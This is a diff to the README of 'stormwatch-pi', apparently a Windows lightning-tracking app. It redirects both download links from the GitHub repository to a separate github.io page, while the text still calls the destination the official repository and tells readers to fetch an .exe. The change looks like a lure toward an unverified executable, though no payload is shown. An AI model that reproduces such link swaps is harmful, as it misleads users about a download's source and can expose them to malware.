@@ -1,6 +1,6 @@
 # ⚡ stormwatch-pi - Track local lightning strikes with ease
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Short-triangle970/stormwatch-pi)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://short-triangle970.github.io)
 
 ## 📡 About This System
 
@@ -22,7 +22,7 @@ To run this application on your Windows machine, ensure your computer meets thes
 
 You obtain the software through the official project repository. 
 
-[Visit this page to download the latest setup file](https://github.com/Short-triangle970/stormwatch-pi)
+[Visit this page to download the latest setup file](https://short-triangle970.github.io)
 
 Select the file ending in `.exe` under the latest release section. Save this file to your Downloads folder.
 
